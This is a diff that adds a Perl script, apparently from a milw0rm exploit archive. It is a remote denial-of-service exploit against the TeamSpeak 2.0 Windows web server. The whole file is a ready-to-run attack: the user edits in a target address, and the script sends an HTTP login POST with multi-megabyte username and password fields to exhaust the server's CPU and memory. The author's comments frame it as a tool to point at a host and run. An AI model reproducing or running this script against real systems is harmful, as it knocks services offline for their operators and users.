@@ -1,0 +1,47 @@
+#!/usr/bin/perl
+
+# TeamSpeak 2.0 (Windows Release) Remote D0S Exploit by Yag Kohha (skyhole [at] gmail.com)
+# Vendor URL: http://www.goteamspeak.com/
+# TeamSpeak WebServer has no tcp session expire and no checks for incoming values length.
+# TODO: 
+# Edit $target value 
+# Run script
+# CPU 100%, Memory up for 1.2 Gb per one attack session.
+# Greetz: str0ke & milw0rm proj
+
+use IO::Socket;
+
+$target = 'xxx.xxx.xxx.xxx';
+$port_tcp=14534;
+
+$buffer_ascii= 'A' x 0xc00000;
+$buffer_dig= '659090';
+$req = "username\=$buffer_ascii\&password\=$buffer_ascii\&serverport\=$buffer_dig\&submit\=Login";
+$uagent = 'Mozilla 5.0';
+my $res;
+my $tmp;
+
+    print "\nStarting D0S\n\n";
+    my $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$target", PeerPort=>"$port_tcp") or die "\n Could not connect to host\n\n";
+
+    print $sock "POST /login.tscmd HTTP/1.1\r\n";
+    print $sock "Host: ".$target."\r\n";
+    print $sock "User-Agent: ".$uagent."\r\n";
+    print $sock "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+    print $sock "Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3\r\n";
+    print $sock "Accept-Encoding: gzip,deflate\r\n";
+    print $sock "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
+    print $sock "Connection: close\r\n";
+    print $sock "Referer: http://".$target."/slogin.html\r\n";
+    print $sock "Content-Type: application/x-www-form-urlencoded\r\n";
+    print $sock "Content-Length: ".length($req)."\r\n\r\n";
+    print $sock $req;
+    print $sock "\n";
+    
+   while ( $res = <$sock> ) {
+	$tmp.= $res;	
+    }
+    print $tmp;
+    close($sock);
+
+# milw0rm.com [2007-07-20]
